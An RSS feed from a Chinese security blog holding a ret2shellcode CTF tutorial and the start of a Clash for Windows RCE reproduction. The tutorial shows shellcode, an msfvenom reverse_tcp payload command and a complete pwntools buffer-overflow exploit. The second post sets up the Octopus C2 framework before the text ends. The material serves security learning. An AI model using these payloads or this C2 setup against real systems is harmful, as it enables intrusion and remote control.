<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>KiraPGR&#39;s Blog</title>
        <link>https://kira-pgr.github.io/</link>
        <description>Recent content on KiraPGR&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Thu, 03 Mar 2022 05:50:08 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>PWN! PWN! PANG! Part5 --- ret2shellcode</title>
        <link>https://kira-pgr.github.io/posts/pwn5/</link>
        <pubDate>Thu, 03 Mar 2022 05:50:08 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/pwn5/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/pwn5/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part5 --- ret2shellcode" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part5&#34;&gt;PWN! PWN! PANG! Part5&lt;/h1&gt;
&lt;p&gt;呼～～好久没有继续更新PWN笔记了 &lt;del&gt;(最近学的Web安全的笔记也没写  逃)&lt;/del&gt;&lt;/p&gt;
&lt;h2 id=&#34;资料投放&#34;&gt;资料投放&lt;/h2&gt;
&lt;p&gt;老规矩，开头上资料= =&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/ERCQKjILLYdJq3hdJTJ0s0kBberJTRKHvXQ25PYHuS-8bQ?e=P2cDdb&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ret2shellcode&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;shellcode&#34;&gt;ShellCode&lt;/h2&gt;
&lt;p&gt;既然今天的话题叫做ret2shellcode,我们先来了解一下&lt;strong&gt;ShellCode&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;什么是shellcode&#34;&gt;什么是ShellCode&lt;/h3&gt;
&lt;p&gt;shellcode是一段用于利用软件漏洞而执行的代码，也可以认为是一段填充数据，shellcode为16进制的机器码，因为经常让攻击者&lt;strong&gt;获得shell&lt;/strong&gt;而得名。shellcode常常使用机器语言编写&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;简而言之，ShellCode就是执行后可以直接getshell的代码&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;如何获取shellcode&#34;&gt;如何获取ShellCode&lt;/h3&gt;
&lt;p&gt;获取ShellCode有很多种方法，这里简单介绍几种&lt;/p&gt;
&lt;h4 id=&#34;利用pwntools自带函数&#34;&gt;利用PWNTools自带函数&lt;/h4&gt;
&lt;p&gt;首先设置&lt;strong&gt;目标程序&lt;/strong&gt; 的参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# os指操作系统，这里是Linux&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# arch指架构，64位一般是amd64，32位一般是i386&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# log_level指日志输出的等级，debug为调试模式&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后用&lt;code&gt;shellcraft.sh()&lt;/code&gt;函数获取ShellCode的&lt;strong&gt;汇编代码&lt;/strong&gt;，再调用&lt;code&gt;asm()&lt;/code&gt;变成机器码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;网上找现成的shellcode&#34;&gt;网上找现成的ShellCode&lt;/h4&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://shell-storm.org/shellcode/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ShellStorm: 一个国外ShellCode集合&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ShellStorm中包含多种平台，多种长度，多种功能的ShellCode&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么ShellCode会考虑长度？&lt;/p&gt;
&lt;p&gt;答: 有时候栈中填入的ShellCode有长度限制&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里举个例子，只有8字节的ShellCode&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x99\x6a\x0b\x58\x60\x59\xcd\x80&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;metasploit&#34;&gt;metasploit&lt;/h4&gt;
&lt;p&gt;想要一个功能更强大且不想要网上到处找？&lt;/p&gt;
&lt;p&gt;MSF的&lt;code&gt;meterpreter&lt;/code&gt;你绝对喜欢&lt;/p&gt;
&lt;p&gt;生成ShellCode命令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;lt;Local IP Address&amp;gt; &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;lt;Local Port&amp;gt; -f &amp;lt;language&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;自己写&#34;&gt;自己写&lt;/h4&gt;
&lt;p&gt;建议新手采用前几种方案，要是各位有兴趣自己写ShellCode的话可以参考这个&lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/docs/english/13610-building-your-own-ud-shellcodes-part-1.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PDF&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;pwn-pwn-pang&#34;&gt;PWN! PWN! PANG?&lt;/h2&gt;
&lt;p&gt;本题思路和ret2text大体差不多，差别主要在返回地址上，ret2text是返回到text段的后门函数，而本次的ret2shellcode是返回到ShellCode&lt;/p&gt;
&lt;p&gt;大家可以先自己试试再看下面的思路分析.QwQ.&lt;/p&gt;
&lt;p&gt;大概先提几点提示:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ShellCode写入哪里呢？&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ShellCode的地址是什么？&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ret2shellcode&#34;&gt;ret2shellcode&lt;/h2&gt;
&lt;p&gt;先&lt;code&gt;checksec&lt;/code&gt;一下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ checksec ret2shellcode
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/pwn/桌面/ROP/ret2shellcode&amp;#39;&lt;/span&gt;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x8048000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    RWX:      Has RWX segments
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看到这个32位程序NX是关闭的，而且有同时可以读，写，执行的段(也就是栈)，我们想到可以把ShellCode写入栈中，并通过栈溢出返回到栈中的ShellCode&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但是，我们貌似忽视了一个重要的问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;目标机一般都是完全打开&lt;strong&gt;ASLR&lt;/strong&gt;，也就意味着每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 我们无法通过反复试验来了解目标所在，因为每次的地址都会不同。&lt;/p&gt;
&lt;p&gt;因此，很显然我们并不能找到ShellCode的地址，也就没办法返回到栈上的ShellCode&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 83; 
			flex-basis: 201px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn5/1.jpg&#34; data-size=&#34;570x679&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn5/1.jpg&#34;
			width=&#34;570&#34;
			height=&#34;679&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn5/1_hucc68de3fc1d99772bd162ef606edf282_348427_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/pwn5/1_hucc68de3fc1d99772bd162ef606edf282_348427_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;啊哦，行不通了= =&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;啊哦，行不通了= =&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;当然，如果各位想尝试一下上面的思路的话，&lt;strong&gt;直接将ASLR关闭即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该利用姿势&lt;strong&gt;ret2stack&lt;/strong&gt;大家可以查看&lt;a class=&#34;link&#34; href=&#34;https://www.bilibili.com/read/cv14181790&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;我朋友BlackRabbit的文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;记得留个关注呐 .QwQ.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;反汇编分析&#34;&gt;反汇编分析&lt;/h3&gt;
&lt;p&gt;查看主函数反编译出的C代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__cdecl&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [esp+1Ch] [ebp-64h] BYREF
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setvbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setvbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;No system for you this time !!!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;strncpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x64u&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;bye bye ~&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以看出这里通过&lt;code&gt;gets()&lt;/code&gt;读入了数组&lt;code&gt;s&lt;/code&gt;,并把数组&lt;code&gt;s&lt;/code&gt;的值传给了&lt;code&gt;buf2&lt;/code&gt;，而这个&lt;code&gt;buf2&lt;/code&gt;位于&lt;code&gt;.bss&lt;/code&gt;节(看起来应该是一个全局变量)&lt;/p&gt;
&lt;p&gt;想到这里，我们&lt;strong&gt;不禁露出了恶毒的笑容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们在数组&lt;code&gt;s&lt;/code&gt;中读入的shellcode会被程序同时放在&lt;code&gt;buf2&lt;/code&gt;中，这样我们通过溢出数组s,把&lt;/p&gt;
&lt;p&gt;&lt;code&gt;main&lt;/code&gt;函数的返回地址覆盖成&lt;code&gt;buf2&lt;/code&gt;的地址即可&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 89; 
			flex-basis: 214px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn5/2.jpg&#34; data-size=&#34;622x696&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn5/2.jpg&#34;
			width=&#34;622&#34;
			height=&#34;696&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/pwn5/2_hue7be457f48e13f9d356491fa28fefd38_391390_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/posts/pwn5/2_hue7be457f48e13f9d356491fa28fefd38_391390_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;思路.QAQ.&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;思路.QAQ.&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
&lt;p&gt;通过gdb调试该程序发现在返回地址前需数据112字节&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gdb调试在这里不再演示了，不会的可以查看&lt;a class=&#34;link&#34; href=&#34;https://kira-pgr.github.io/posts/pwn4/#%E7%B2%BE%E5%BF%83%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E6%95%B0%E6%8D%AE&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;上一篇文章&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但由于我们还需要写入ShellCode，我们必须选一个&lt;strong&gt;小于等于112字节&lt;/strong&gt;的ShellCode,并把&lt;strong&gt;不足&lt;/strong&gt;112字节的部分用&lt;strong&gt;垃圾数据填充&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由此写出EXP:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ret2shellcode&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./ret2shellcode&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;symbols&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;buf2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#shellcode.ljust(112,b&amp;#39;A&amp;#39;)指shellcode不够112字节的地方用A填充&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ref&#34;&gt;Ref&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_43916678/article/details/107181228&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/weixin_43916678/article/details/107181228&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_35495684/article/details/79583232&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/qq_35495684/article/details/79583232&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bilibili.com/read/cv14181790&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.bilibili.com/read/cv14181790&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/culinxia2707/article/details/108788113&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/culinxia2707/article/details/108788113&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Clash猫猫RCE复现(弹shell)</title>
        <link>https://kira-pgr.github.io/posts/clash_rce/</link>
        <pubDate>Fri, 25 Feb 2022 23:27:12 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/clash_rce/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/clash_rce/cover.jpg" alt="Featured image of post Clash猫猫RCE复现(弹shell)" /&gt;&lt;h1 id=&#34;clash-for-windows-rce弹shell&#34;&gt;Clash For Windows RCE弹Shell&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;小白:RCE是什么&lt;/p&gt;
&lt;p&gt;&lt;del&gt;大佬:Reliable Computer Engineering (可靠的电脑工程)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;咳咳，应该是Remote Code Execution(远程代码执行)= =&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;免责声明&#34;&gt;免责声明&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;本文章为PGR的个人漏洞复现笔记，仅供参考/学习，如用文章中技术造成任何损失的后果自负&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;前期准备&#34;&gt;前期准备&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Tip:请使用一个Linux机器和一个Windows机器，否则可能会出现&amp;lt;意想不到&amp;gt;的问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(没有Linux? 去下载一个&lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/get-kali/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Kali Linux&lt;/a&gt;吧)&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;一个有漏洞的clash-windows-客户端&#34;&gt;一个有漏洞的Clash Windows 客户端&lt;/h3&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.19.8/Clash.for.Windows-0.19.8-win.7z&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;下载地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下载后按照提示在Windows系统下安装即可&lt;/p&gt;
&lt;h3 id=&#34;c2工具octopus&#34;&gt;C2工具Octopus&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;在一个装好了Python3和Git的Linux系统执行以下的操作&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你没有安装，请参考&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://kira-pgr.github.io/posts/hugo1/#%E5%AE%89%E8%A3%85git%E7%B3%BB%E7%BB%9F%E5%B7%B2%E7%BB%8F%E9%A2%84%E8%A3%85%E7%9A%84%E8%87%AA%E8%A1%8C%E5%BF%BD%E7%95%A5&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安装Git&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;安装Python3: 终端输入sudo apt install python3&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(由于大部分系统已经预装，如果你非deb系请自主上网搜索安装方式)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;git clone https://github.com/mhaskar/Octopus.git
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Octopus
pip install -r requirements.txt
python3 octopus.py
